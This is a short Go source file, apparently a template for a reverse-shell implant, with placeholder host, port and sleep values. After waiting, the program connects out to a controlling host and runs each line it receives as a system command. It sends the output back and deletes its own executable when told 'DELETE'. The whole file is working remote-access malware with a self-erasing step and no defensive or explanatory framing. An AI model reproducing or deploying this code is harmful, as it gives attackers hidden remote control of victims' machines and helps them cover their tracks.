package main

import (
   "bufio"
   "fmt"
   "net"
   "os/exec"
   "os"
   "strings"
   "time"
)

func FUNC_DELETE(){
    os.Remove(os.Args[0])
}

func FUNC_SLEEP(){
    time.Sleep(SECONDS*time.Second) 
}

func FUNC_HANDLE(conn net.Conn){
    message, _ := bufio.NewReader(conn).ReadString('\n')
    if message == "DELETE\n" {
        FUNC_DELETE()
    }
    out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()
    if err != nil {
        fmt.Fprintf(conn, "%s\n",err)
    }
    fmt.Fprintf(conn, "%s\n",out)
}

func main() {
    FUNC_SLEEP()
    conn, _ := net.Dial("CONN_TYPE", "HOST:PORT")
    for {
        FUNC_HANDLE(conn)
    }
}
